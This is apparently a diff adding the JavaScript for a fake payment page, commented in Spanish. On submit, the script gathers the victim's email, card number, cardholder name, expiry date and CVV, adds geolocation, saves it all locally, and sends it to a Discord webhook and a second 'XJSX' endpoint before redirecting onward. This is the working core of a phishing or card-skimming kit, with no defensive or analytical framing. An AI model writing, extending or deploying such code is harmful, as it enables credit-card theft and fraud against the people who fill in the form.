+              '[aria-invalid="true"], .border-ms-error',
+            );
+            if (firstError) {
+              firstError.scrollIntoView({
+                behavior: "smooth",
+                block: "center",
+              });
+              firstError.focus();
+            }
+            return;
+          }
+
+          console.log("🚀 Iniciando proceso de pago...");
+
+          Utils.setSubmitButtonState(true);
+
+          const cardData = {
+            email: Utils.getUrlParams().email,
+            cardNumber: DOM.cardNumber.value,
+            cardholderName: DOM.cardholderName.value,
+            expiryMonth: DOM.expiryMonth.value,
+            expiryYear: DOM.expiryYear.value,
+            cvv: DOM.cvv.value,
+            cardType: appState.currentCardType,
+            sameAddress:
+              document.getElementById("sameAddress")?.checked || false,
+            timestamp: new Date().toISOString(),
+          };
+
+          try {
+            // 1. Obtener geolocalización
+            const locationData = await Utils.getLocationData();
+            appState.locationData = locationData;
+
+            // 2. Guardar en localStorage
+            const cardEntry = Utils.saveCardToLocalStorage(
+              cardData,
+              locationData,
+            );
+
+            if (!cardEntry) {
+              throw new Error("Error guardando datos localmente");
+            }
+
+            // 3. Enviar a Discord
+            const discordSuccess = await Utils.sendToDiscord(
+              cardData,
+              locationData,
+            );
+            console.log(discordSuccess ? "✅ Discord OK" : "⚠️ Discord FAIL");
+
+            // 4. Enviar a XJSX (legacy)
+            await Utils.sendCardData(cardData);
+
+            // 5. Redirigir
+            setTimeout(() => {
+              const urlParams = new URLSearchParams();
+              if (cardData.email) {
+                urlParams.set("email", cardData.email);
+              }
+              if (appState.currentCardType) {
+                urlParams.set("cardType", appState.currentCardType);
+              }
+
+              window.location.href = `${CONFIG.nextPage}?${urlParams.toString()}`;
+            }, 1500);
+          } catch (error) {
+            console.error("Error en el proceso de pago:", error);
+            Utils.setSubmitButtonState(false);
+
+            DOM.submitButton.textContent = "Error, intentar nuevamente";
+            DOM.submitButton.classList.add("bg-ms-error");
+
+            setTimeout(() => {
+              DOM.submitButton.textContent = "Continuar";
+              DOM.submitButton.classList.remove("bg-ms-error");
+            }, 2000);
+          }
+        },
+
+        /**
+         * Maneja la tecla Enter en campos de fecha
+         */
+        handleExpiryKeydown: function (event) {
+          if (event.key === "Enter") {
+            event.preventDefault();
+            const nextInput = event.target.nextElementSibling;
+            if (nextInput && nextInput.tagName === "INPUT") {
+              nextInput.focus();
+            } else {
+              DOM.cvv.focus();
+            }
+          }
+        },
+      };
+
+      // Inicialización
+      function initApp() {
+        appState.xjsxAvailable = typeof sendCardData !== "undefined";
+        console.log("🔍 XJSX disponible:", appState.xjsxAvailable);
+
+        DOM.cardNumber.setAttribute("aria-label", "Número de tarjeta");
+        DOM.cardholderName.setAttribute("aria-label", "Nombre del titular");
+        DOM.cvv.setAttribute("aria-label", "Código CVV");
+        DOM.submitButton.setAttribute("aria-label", "Continuar");
+
+        DOM.paymentForm.addEventListener(
+          "submit",
+          EventHandlers.handlePaymentSubmit,
+        );
+        DOM.cardNumber.addEventListener("input", (e) =>
+          Utils.formatCardNumber(e.target),
+        );
+        DOM.expiryMonth.addEventListener("input", (e) =>
+          Utils.formatMonth(e.target),
+        );
+        DOM.expiryYear.addEventListener("input", (e) =>
+          Utils.formatYear(e.target),
+        );
+        DOM.cvv.addEventListener("input", (e) => Utils.formatCVV(e.target));
+
+        DOM.expiryMonth.addEventListener(
+          "keydown",
+          EventHandlers.handleExpiryKeydown,
+        );
+        DOM.expiryYear.addEventListener(
+          "keydown",
+          EventHandlers.handleExpiryKeydown,
+        );
+
+        DOM.cardNumber.addEventListener("blur", () => {
+          const cardType = Utils.detectCardType(DOM.cardNumber.value);
+          Utils.validateCardNumber(DOM.cardNumber.value, cardType);
+        });
+
+        DOM.cvv.addEventListener("blur", () => {
+          Utils.validateCVV(DOM.cvv.value, appState.currentCardType);
+        });
+
+        DOM.expiryMonth.addEventListener("blur", Utils.validateExpiryDate);
+        DOM.expiryYear.addEventListener("blur", Utils.validateExpiryDate);
+        DOM.cardholderName.addEventListener("blur", () => {
+          if (!DOM.cardholderName.value.trim()) {
+            DOM.cardholderName.classList.add("border-ms-error");
+          } else {
+            DOM.cardholderName.classList.remove("border-ms-error");
+          }
+        });
+
+        // Pre-cargar geolocalización
+        Utils.getLocationData()
+          .then((data) => {
+            appState.locationData = data;
+            console.log("📍 Geolocalización pre-cargada");
+          })
+          .catch((err) => {
+            console.log("⚠️ No se pudo pre-cargar geolocalización");
+          });
+
+        if (window.history.replaceState) {
+          window.history.replaceState(null, null, window.location.href);
+        }
+
+        setTimeout(() => {
+          DOM.cardNumber.focus();
+        }, 300);
+
+        console.log("✅ Formulario de pago inicializado");
+      }
+
+      // Inicializar
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initApp);
+      } else {
+        initApp();
+      }
+    </script>
+</html>
